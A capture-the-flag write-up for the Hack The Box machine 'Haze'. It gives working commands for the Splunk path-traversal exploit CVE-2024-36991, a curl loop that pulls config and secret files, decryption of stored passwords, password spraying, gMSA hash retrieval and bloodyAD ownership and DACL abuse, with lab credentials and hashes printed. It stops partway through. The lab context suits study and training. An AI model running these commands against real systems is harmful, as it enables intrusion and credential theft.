---
icon: traffic-light-stop
---

# HTB-HAZE

<figure><img src="../../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

**Initial Access:**

1. **Splunk** instance exposed externally.
2. Exploit **CVE-2024-36991** (path traversal) to **read local files**.
3. Extract **encrypted passwords and secrets** from Splunk configuration.
4. **Decrypt Splunk secrets** to gain a foothold as **paul.taylor**.

**Privilege Escalation:**\
5\. Use **password spraying** to compromise **mark.adams**.\
6\. **Modify GMSA group membership** to gain access as **HAZE-IT-BACKUP$**.\
7\. Take ownership of relevant groups and assign **GenericAll** permissions to gain a shell as **edward.martin**.\
8\. Access the **Splunk backup**, extracting more **encrypted passwords and secrets**.\
9\. **Decrypt these secrets** to gain access to the **Splunk Web UI**.\
10\. Deploy a **custom Splunk app with a reverse shell**, getting a shell as **alexander.green**.\
11\. Exploit **SeImpersonatePrivilege** to escalate to **SYSTEM**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
(sn0x㉿sn0x)-[~/hackthebox/HAZE/CVE-2024-36991]
└─$ nmap -sSCV Pn 10.10.11.61 -min-rate 10000
 Starting Nmap 7.95  <https://nmap.org> ) at 20250329 1516 EDT
 Nmap scan report for 10.10.11.61
 Host is up 0.10s latency).
 Not shown: 985 closed tcp ports (reset)
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 20250330 031621Z
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP Domain: haze.htb0., Site: Default-First-Site-Na
 me)
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
 | Not valid before: 20250305T071220
 |_Not valid after:  20260305T071220
 445/tcp  open  microsoft-ds?
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP Domain: haze.htb0., Site: Default-First-Site-N
 ame)
 | ssl-cert: Subject: commonName=dc01.haze.htb
 Haze
 2
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
 | Not valid before: 20250305T071220
 |_Not valid after:  20260305T071220
 |_ssl-date: TLS randomness does not represent time
 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP Domain: haze.htb0., Site: Default-First-Site-Na
 me)
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
 | Not valid before: 20250305T071220
 |_Not valid after:  20260305T071220
 |_ssl-date: TLS randomness does not represent time
 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP Domain: haze.htb0., Site: Default-First-Site-N
 ame)
 |_ssl-date: TLS randomness does not represent time
 | ssl-cert: Subject: commonName=dc01.haze.htb
 | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.haze.htb
 | Not valid before: 20250305T071220
 |_Not valid after:  20260305T071220
 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
 8000/tcp open  http          Splunkd httpd
 | http-title: Site doesn't have a title (text/html; charset=UTF8.
 |_Requested resource was <http://10.10.11.618000/en-US/account/login?return_to=%2Fen-US%2F>
 |_http-server-header: Splunkd
 | http-robots.txt: 1 disallowed entry 
|_/
 8088/tcp open  ssl/http      Splunkd httpd
 |_http-title: 404 Not Found
 |_http-server-header: Splunkd
 | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
 | Not valid before: 20250305T072908
 |_Not valid after:  20280304T072908
 8089/tcp open  ssl/http      Splunkd httpd
 | http-robots.txt: 1 disallowed entry 
|_/
 | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
 | Not valid before: 20250305T072908
 |_Not valid after:  20280304T072908
 |_http-title: splunkd
 |_http-server-header: Splunkd
 Service Info: Host: DC01; OS Windows; CPE cpe:/o:microsoft:windows
 Host script results:
 | smb2-security-mode: 
|   311 
|_    Message signing enabled and required
 | smb2-time: 
|   date: 20250330T031709
 |_  start_date: N/A
 |_clock-skew: 8h00m00s
 Haze
 3
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
 Nmap done: 1 IP address 1 host up) scanned in 66.21 seconds
```

Performing a standard **Nmap scan** reveals that the target is a **Domain Controller**. Alongside the expected Active Directory ports, it is also running a **Splunk instance** accessible on ports **8000, 8088, and 8089**. I add the discovered **domain** and the **DC hostname** to my `/etc/hosts` file to streamline further AD-related operations.

Exploring the **Splunk Atom Feed** at `https://haze.htb:8089` reveals the **running Splunk version**. Since a Splunk installation is unusual on this machine, I begin investigating potential **vulnerabilities and exploits** related to it.

#### Add to `Etc/hosts`

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE/CVE-2024-36991]
└─$ echo "10.10.11.61  haze.htb" | sudo tee -a /etc/hosts > /dev/null
```

<figure><img src="../../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE/CVE-2024-36991]
└─$ python3 CVE-2024-36991.py -u <http://haze.htb:8000>
/home/sn0x/hackthebox/HAZE/CVE-2024-36991/CVE-2024-36991.py:55: SyntaxWarning: invalid escape sequence '\\ '
  LOG_DIR = 'logs'

                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\\ \\   / | ____|   |___ \\ / _ |___ \\| || |      |___ / / /_ / _ \\ / _ \\/ |
| |    \\ \\ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \\| '_ | (_) | (_) | |
| |___  \\ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \\__, |\\__, | |
 \\____|  \\_/  |_____|   |_____|\\___|_____|  |_|      |____/ \\___/  /_/   /_/|_|
                                                                           
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
-> By x.com/MohamedNab1l
-> Use Wisely.

[INFO] Testing single target: <http://haze.htb:8000>
[WARNING] Not Vulnerable: <http://haze.htb:8000>

```

## Foothold <a href="#foothold" id="foothold"></a>

### CVE-2024-36991 <a href="#cve-2024-36991" id="cve-2024-36991"></a>

While researching potential vulnerabilities, I come across **CVE-2024-36991**, a **path traversal flaw** in Splunk Enterprise. This vulnerability allows an **unauthenticated attacker** to read arbitrary files from the system. It affects all Splunk Enterprise Windows versions up to **9.2.2**, meaning the target version is vulnerable.

For initial testing, I use a **proof-of-concept (PoC)** from GitHub designed to read `/etc/passwd`. Pointing it at the Splunk instance confirms that the CVE is exploitable and allows me to enumerate the **configured users** on the system.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ $ python3 CVE-2024-36991.py -u http://dc01.haze.htb:8000
                                                                        
  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _ 
 / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |
| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| '_ | (_) | (_) | |
| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |
 \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|
                                                                           
-> POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
-> By x.com/MohamedNab1l
-> Use Wisely.
 
[INFO] Log directory created: logs
[INFO] Testing single target: http://dc01.haze.htb:8000
[VLUN] Vulnerable: http://dc01.haze.htb:8000
:admin:$6$Ak3m7.aHgb/NOQez$O7C8Ck2lg5RaXJs9FrwPr7xbJBJxMCpqIx3TG30Pvl7JSvv0pn3vtYnt8qF4WhL7hBZygwemqn7PBj5dLBm0D1::Administrator:admin:changeme@example.com:::20152
:edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
:mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
:paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152
```

Examining the exploit code reveals that it can be simplified into a **single `cURL` command**. To automate the retrieval of multiple files, I first compile a **list of potentially interesting Splunk files**, referencing the official **Splunk documentation**.

<details>

<summary>List of Configurations</summary>

alert\_actions.conf\
app.conf\
audit.conf\
authentication.conf\
authorize.conf\
bookmarks.conf\
checklist.conf\
collections.conf\
commands.conf\
datamodels.conf\
deploymentclient.conf\
distsearch.conf\
event\_renderers.conf\
eventtypes.conf\
federated.conf\
fields.conf\
global-banner.conf\
health.conf\
indexes.conf\
inputs.conf\
limits.conf\
literals.conf\
macros.conf\
messages.conf\
metric\_rollups.conf\
multikv.conf\
outputs.conf\
passwords.conf\
procmon-filters.conf\
props.conf\
pubsub.conf\
restmap.conf\
rolling\_upgrade.conf\
savedsearches.conf\
searchbnf.conf\
segmenters.conf\
server.conf\
serverclass.conf\
serverclass.seed.xml.conf\
source-classifier.conf\
sourcetypes.conf\
tags.conf\
telemetry.conf\
times.conf\
transactiontypes.conf\
transforms.conf\
ui-prefs.conf\
user-prefs.conf\
user-seed.conf\
visualizations.conf\
viewstates.conf\
web.conf\
web-features.conf\
wmi.conf\
workflow\_actions.conf\
workload\_policy.conf\
workload\_pools.conf\
workload\_rules.conf

</details>

I saved the list of filenames into **`configs.txt`** and used the following shell script to download all the potentially interesting Splunk configuration files:

```bash
while read c; do
  curl -s "http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/$c" > $c
done < configs.txt
```

After downloading the files, I searched them for **credentials and other sensitive information**. A simple `grep` command revealed **three potential passwords** that could be used for further exploitation.

```
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ grep -ir pass .
./server.conf:pass4SymmKey = $7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA==
./server.conf:sslPassword = $7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw==
./authentication.conf:minPasswordLength = 8
./authentication.conf:minPasswordUppercase = 0
./authentication.conf:minPasswordLowercase = 0
./authentication.conf:minPasswordSpecial = 0
./authentication.conf:minPasswordDigit = 0
./authentication.conf:bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
```

The retrieved passwords are **not hashed**, but actually **encrypted**. They can be decrypted using a tool like **`splunksecrets`**. I install the tool via **`uv`** and examine the required parameters to decrypt these encrypted strings

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ uv tool install splunksecrets

┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$splunksecrets splunk-decrypt --help
Usage: splunksecrets splunk-decrypt [OPTIONS]
 
  Decrypt password using Splunk 7.2 algorithm
 
Options:
  -S, --splunk-secret TEXT  [required]
  --ciphertext TEXT
  --help                    Show this message and exit.
```

To decrypt the passwords, I also need the **`splunk.secrets`** file, which is located in **`$SPLUNK_HOME/etc/auth`**. I retrieve this file using another **`cURL`** command.

```
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ curl -s "http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.secret" > splunk.secret
 
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ cat splunk.secret
NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD
```

The password from `server.conf` decrypt to the default password of `changeme`.

```
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$lPCemQk01ejJvI8nwCjXjx7PJclrQJ+SfC3/ST+K0s+1LsdlNuXwlA=='
changeme
 
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$/nq/of9YXJfJY+DzwGMxgOmH4Fc0dgNwc5qfCiBhwdYvg9+0OCCcQw=='
password
```

The last password decrypts to an likely actual password.

```

┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
Ld@p_Auth_Sp1unk@2k24

```

Following the successful decryption I take another look at the entire file to see which user the password belongs to. From the configuration I can “only” gather the distinguished name of the user.

```python
[splunk_auth]
minPasswordLength = 8
minPasswordUppercase = 0
minPasswordLowercase = 0
minPasswordSpecial = 0
minPasswordDigit = 0
 
[Haze LDAP Auth]
SSLEnabled = 0
anonymous_referrals = 1
bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb
bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=
charset = utf8
emailAttribute = mail
enableRangeRetrieval = 0
groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb
groupMappingAttribute = dn
groupMemberAttribute = member
groupNameAttribute = cn
host = dc01.haze.htb
nestedGroups = 0
network_timeout = 20
pagelimit = -1
port = 389
realNameAttribute = cn
sizelimit = 1000
timelimit = 15
userBaseDN = CN=Users,DC=haze,DC=htb
userNameAttribute = samaccountname
 
[authentication]
authSettings = Haze LDAP Auth
authType = LDAP
```

### Password Spray

To derive potential usernames from the **distinguished name**, I use **`username-anarchy`** to generate a list of possible accounts. I then **spray the decrypted password** against these usernames to identify valid logins.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ username-anarchy Paul Taylor > paul_usernames.txt
 
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ nxc smb haze.htb -u paul_usernames.txt -p 'Ld@p_Auth_Sp1unk@2k24'
SMB         10.129.221.84   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.221.84   445    DC01             [-] haze.htb\paul:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\paultaylor:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
```

Once I have **valid credentials**, I start gathering information about the domain. I initially ran **BloodHound**, but running it as `paul.taylor` proved limited due to insufficient permissions. Normally, the **`--users-export`** flag could be used, but it fails here.

As a workaround, I resort to **RID cycling** to enumerate domain objects without relying on elevated permissions.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ nxc smb haze.htb -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' --rid-brute | grep 'SidTypeUser' | grep -oP 'HAZE\\.*? ' | awk -F '\' '{print $2}'
Administrator
Guest
krbtgt
DC01$
paul.taylor
mark.adams
edward.martin
alexander.green
Haze-IT-Backup$
```

With a **refined list of domain users**, I perform a **second round of password spraying**. This reveals a case of **password reuse**, allowing me to successfully authenticate as **`mark.adams`**.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ nxc smb haze.htb -u loot/usernames.txt -p 'Ld@p_Auth_Sp1unk@2k24' --continue-on-success
SMB         10.129.221.84   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
SMB         10.129.221.84   445    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.221.84   445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
SMB         10.129.221.84   445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
SMB         10.129.221.84   445    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE
```

## Internal Recon <a href="#internal-recon" id="internal-recon"></a>

As mentioned earlier, I ran the **BloodHound ingestor** as soon as I obtained valid domain credentials. However, the collected data appeared **incomplete**. Several **SIDs could not be resolved**, and users like **`mark.adams`** were missing. The output confirmed this limitation, showing that only **three users** were captured.

<figure><img src="../../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ bloodhound-ce-python -u 'paul.taylor' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb' -c All -ns 10.129.221.84
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 3 users
INFO: Found 32 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 18 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 03S
```

As a **sanity check**, I reran the BloodHound ingestor using the credentials of **`mark.adams`**. This time, a **significantly larger amount of domain data** was collected, confirming the previous limitations were due to insufficient privileges.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ bloodhound-ce-python -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d 'haze.htb' -c All -ns 10.129.221.84
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 8 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 03S
```

Jumping ahead a bit, after accessing the machine via **WinRM** and enumerating ACLs between compromised and interesting objects, I discovered why **`paul.taylor`** could see only a few user objects.

The account is **explicitly denied** permission to read the properties of the **Users group**, which contains the list of members. Additionally, it is denied **`GenericExecute`**, a permission required to list the contents of a container.

```python
operator@sliver$ standin -- --object distinguishedname="CN=Users,DC=haze,DC=htb" --access --ntaccount="HAZE\paul.taylor"
 
[*] standin output:
 
[?] Using DC : dc01.haze.htb
[?] Object   : CN=Users
    Path     : LDAP://CN=Users,DC=haze,DC=htb
 
[+] Object properties
    |_ Owner : HAZE\Domain Admins
    |_ Group : HAZE\Domain Admins
 
[+] Object access rules
 
[+] Identity --> HAZE\paul.taylor
    |_ Type       : Deny
    |_ Permission : ReadProperty, GenericExecute
```

### Group Managed Service Account (GMSA)

After running **BloodHound twice**, a more complete view of the domain starts to emerge. I notice that **`mark.adams`** is a member of the **`gMSA_Managers`** group. However, this group does **not have any outbound object control**, such as **`readGMSAPassword`**, over the **`Haze-IT-Backup$`** account that was initially discovered during **RID cycling**.

Attempting to blindly retrieve gMSA hashes using **`nxc`** also proves unsuccessful.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ nxc ldap haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
SMB         10.129.221.84   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.221.84   636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       10.129.221.84   636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.221.84   636    DC01             Account: Haze-IT-Backup$      NTLM:
```

At this stage, I connected to the machine as **`mark.adams`** via **WinRM** and performed further enumeration of the gMSA account using the **pre-installed RSAT PowerShell modules**.

Examining the account’s properties reveals that **only members of the Domain Admins group** are currently permitted to read the gMSA NT hash.

```python
$ Get-ADServiceAccount Haze-IT-Backup -Properties PrincipalsAllowedToRetrieveManagedPassword
 
 
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
 
```

Instead of transferring tools onto the machine, I use my **Sliver Dropper** to get a **Beacon** as **`mark.adams`**. From there, I employ a tool called **StandIn** to enumerate the **access permissions** of the **`Haze-IT-Backup$`** account and filter the output to highlight entries where **`HAZE\gMSA_Managers`** appears in an ACE.

At the bottom of the output, it becomes clear that as a member of **`gMSA_Managers`**, **`mark.adams`** has **write access** to the **`msDS-GroupMSAMembership`** property.

```python
operator@sliver$ standin -- --object samaccountname="Haze-IT-Backup$" --access --ntaccount="HAZE\gMSA_Managers"
 
[*] standin output:
 
[?] Using DC : dc01.haze.htb
[?] Object   : CN=Haze-IT-Backup
    Path     : LDAP://CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
 
[+] Object properties
    |_ Owner : HAZE\Domain Admins
    |_ Group : HAZE\Domain Admins
 
[+] Object access rules
 
[+] Identity --> HAZE\gMSA_Managers
    |_ Type       : Allow
    |_ Permission : ReadProperty, GenericExecute
    |_ Object     : ANY
 
[+] Identity --> HAZE\gMSA_Managers
    |_ Type       : Allow
    |_ Permission : WriteProperty
    |_ Object     : msDS-GroupMSAMembership
```

This property, as described by **Netwrix**, contains a list of objects that are permitted to **read the password** of the gMSA. This means I can leverage the **write permission** to grant any account the ability to **read the gMSA password**.

Using the **RSAT tools**, I set **`mark.adams`** in the **`msDS-GroupMSAMembership`** property and then query the gMSA account again to **verify that my modification was successful**.

```python
$ Set-ADServiceAccount -Identity 'Haze-IT-Backup' -PrincipalsAllowedToRetrieveManagedPassword 'mark.adams'
 
$ Get-ADServiceAccount 'Haze-IT-Backup' -Properties PrincipalsAllowedToRetrieveManagedPassword
 
 
DistinguishedName                          : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
Enabled                                    : True
Name                                       : Haze-IT-Backup
ObjectClass                                : msDS-GroupManagedServiceAccount
ObjectGUID                                 : 66f8d593-2f0b-4a56-95b4-01b326c7a780
PrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}
SamAccountName                             : Haze-IT-Backup$
SID                                        : S-1-5-21-323145914-28650650-2368316563-1111
UserPrincipalName                          :
```

With the modification in place, I can now rerun the **`nxc`** command from earlier and **successfully retrieve the NT hash** of **`Haze-IT-Backup$`**.

```python
$ nxc ldap haze.htb -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
SMB         10.129.221.84   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.221.84   636    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24
LDAPS       10.129.221.84   636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.221.84   636    DC01             Account: Haze-IT-Backup$      NTLM: 735c02c6b2dc54c3c8c6891f55279ebc
```

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### DACL Abuse

At this stage, feeling somewhat cautious, I reran **BloodHound** using the **`Haze-IT-Backup$`** account. However, this only yielded a **very small amount of new information**.

```python
$ bloodhound-ce-python -u 'Haze-IT-Backup$' --hashes ':735c02c6b2dc54c3c8c6891f55279ebc' -d 'haze.htb' -c All -ns 10.129.221.84
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 03S
```

uring previous enumeration with StandIn (not show on the blog) and now also in BloodHound I can see a path towards the user `edwards.martin`. Which is also a member of the `Remote Management User` group.

<figure><img src="../../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

From this point onward, the process is fairly straightforward **DACL abuse**. I start by taking **full control** of the **`support_services`** group by making an attacker-controlled account the **new owner**. I then leverage this ownership to grant myself **`GenericAll`** permissions over the group.

```python
$ bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' set owner 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' 'CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB'
[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB on CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB
 
$ bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' add genericAll 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' 'CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB'
[+] CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB has now GenericAll on CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB
```

With control over the group, I next add an **attacker-controlled account** to it and abuse the **`AddKeyCredentialLink`** method to perform the **Shadow Credential** technique, allowing me to retrieve the **NT hash of `edwards.martin`**.

Since requesting the NT hash triggers a **TGT request**, I first **synchronize my system time** with the Domain Controller to avoid any Kerberos time issues.

```python
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ bloodyAD --host dc01.haze.htb -d haze.htb -u 'Haze-IT-Backup$' -p ':735c02c6b2dc54c3c8c6891f55279ebc' add groupMember 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' 'CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB'
[+] CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB added to CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB
 
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
└─$ sudo timedatectl set-ntp 0
 
$ sudo rdate -n 10.129.221.84
 
┌──(sn0x㉿sn0x)-[~/hackthebox/HAZE]
